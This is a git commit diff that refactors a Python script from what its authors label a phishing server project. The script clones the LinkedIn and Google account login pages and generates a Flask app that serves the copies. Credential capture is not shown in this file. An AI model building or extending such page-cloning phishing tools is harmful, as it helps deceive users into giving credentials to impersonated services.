e850eb09840bbbe998ba1e0eae28edf736f601fa
kareemY10 <kareem.skr@gmail.com>
2022-08-28 15:53:11 +0300

    fixes for Final.py

--- Final.py
+++ Final.py
@@ -1,63 +1,65 @@
 import PDFProcessor
 import Clone as Builder
-import ServerCreator
 
 dict={}
 
-#Links=PDFProcessor.getLinks("C:\\Users\\user\\Desktop\\Phishing-Bot-PDF-\\PDFRoom\\datasprings_dynamiclogin_userguide.pdf")
 
 Links=['https://www.linkedin.com/home/?originalSubdomain=il','https://accounts.google.com/']
+
 
 
 i=1
 
 
-
-Header="""from flask import render_template\n
+def BuildServer (Links):
+    global i
+    
+    Header="""from flask import render_template\n
 from flask import Flask, render_template,request \n
 app=Flask(__name__)\n
 
-"""
+    """
 
 
 
-Basic="""
+    Basic="""
 @app.route('/')
 def indexREPLACEME():\n
     return "welcome kareem and mohaamed's phishing server "\n
-"""
+    """
 
-NewRoute="""
+    NewRoute="""
 @app.route('/REPLACEME')
 def indexREPLACEME():\n
     return render_template("REPLACEME.html")\n
-"""
+    """
 
-memoryvar=NewRoute
+    memoryvar=NewRoute
 
-End="""
+    End="""
 if __name__ == '__main__':\n
     app.run( port=8080 ,debug=True)
 
- """
+    """
+    f = open("app.py", "w")
+    f.write(Header)
+    f.write(Basic)
+    
 
 
-f = open("app.py", "w")
-f.write(Header)
-f.write(Basic)
+    for link in Links:
+        NewFileName=str(i)+'.html'
+        dict[link]='http://localhost:8080/'+NewFileName
+        Builder.Clone(link,NewFileName)
+        NewRoute=NewRoute.replace('REPLACEME', str(i), 3)
+        f.write(NewRoute)
+        NewRoute=memoryvar
+        i+=1
 
+    f.write(End)
+    f.close()
+    print('Server file was built at app.py')
 
-for link in Links:
-    NewFileName=str(i)+'.html'
-    dict[link]='http://localhost:8080/'+NewFileName
-    Builder.Clone(link,NewFileName)
-    NewRoute=NewRoute.replace('REPLACEME', str(i), 3)
-    f.write(NewRoute)
-    NewRoute=memoryvar
-    i+=1
-
-f.write(End)
-f.close()
-print('Server file was built at app.py')
+BuildServer(Links)
 
 
